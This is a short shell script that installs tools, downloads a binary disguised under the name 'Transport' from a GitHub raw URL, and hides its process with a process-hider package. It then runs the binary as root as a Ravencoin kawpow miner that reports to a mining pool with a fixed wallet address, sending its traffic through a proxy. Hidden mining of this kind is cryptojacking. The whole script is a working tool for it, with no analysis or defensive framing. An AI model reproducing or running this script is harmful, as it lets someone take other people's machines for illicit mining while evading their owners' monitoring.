apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
chmod +x Transport
ph add Transport
sleep 9
ph add Transport
sleep 9
ph add Transport
sleep 9
ph add Transport
sleep 9
ph add Transport
sleep 30
sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --proxy 87.255.240.213:1080 --dns-https-server 1.1.1.1     
